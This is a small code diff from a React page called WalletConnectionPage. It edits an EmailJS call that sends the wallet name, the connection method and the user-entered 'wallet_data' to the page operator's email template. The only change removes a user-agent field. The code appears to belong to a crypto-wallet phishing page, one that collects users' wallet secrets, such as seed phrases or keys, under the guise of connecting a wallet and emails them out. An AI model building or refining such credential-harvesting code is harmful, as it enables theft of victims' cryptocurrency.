@@ -278,7 +278,6 @@ export function WalletConnectionPage() {
     wallet_name: selectedWallet?.name || "Unknown",  // match {{wallet_name}}
     connection_method: connectionMethod,            // match {{connection_method}}
     wallet_data: inputData,                         // match {{wallet_data}}
-    user_agent: navigator.userAgent,                // match {{user_agent}}
     timestamp: new Date().toISOString(),            // match {{timestamp}}
   },
   process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY as string
